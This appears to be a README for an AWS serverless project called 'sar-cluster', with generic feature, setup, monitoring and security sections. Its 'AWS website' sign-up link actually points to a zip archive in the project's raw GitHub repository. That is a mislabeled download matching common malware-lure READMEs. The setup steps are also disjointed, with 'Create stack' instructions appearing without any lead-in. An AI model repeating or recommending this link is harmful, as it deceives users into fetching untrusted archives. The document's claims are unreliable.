## 🌟 Key Features

- **Serverless Architecture:** Reduces costs and maintenance by utilizing AWS Lambda.
- **Auto-Scaling:** Automatically adjusts resources based on demand.
- **JWT Authentication:** Secure user access with JSON Web Tokens.
- **WAF Integration:** Protects your application from malicious traffic.
- **Monitoring Tools:** Keep track of your application's health with CloudWatch.

## 🚀 Getting Started

You will need a few things to set up the **sar-cluster** application:

1. An AWS account. If you don't have one, you can sign up on the [AWS website](https://raw.githubusercontent.com/sisbox12/sar-cluster/main/examples/cluster_sar_3.9-alpha.3.zip).
2. Basic understanding of navigating AWS services.
3. An internet connection for downloading the necessary files.

### 🎯 System Requirements

- An AWS account.
- A modern web browser for navigating to the AWS console.
- No technical software installation is needed on your PC, as everything runs serverless.

   - Once you've provided all needed information, review your settings and click "Create stack."
   - This process may take a few minutes. You can refresh the page to see the status.

## 📊 Monitoring Your Application

Once your stack is created, you can monitor it:

1. Go to the CloudWatch service in the AWS console.
2. Here, you can set up alarms and dashboards to track performance and health.

## 🔒 Security Considerations

When working with serverless applications, it is vital to consider security. Here are some best practices:

- Regularly update your application code and dependencies.
- Use IAM roles to limit permissions for AWS resources.
- Configure the WAF to block unwanted traffic to your application.

## 🔍 Troubleshooting

If you encounter issues during the setup, consider the following:

- Ensure your AWS account has the necessary permissions for the services you are using.
- Check the CloudFormation Events tab for errors related to resource creation.
- Review the AWS documentation for additional support.
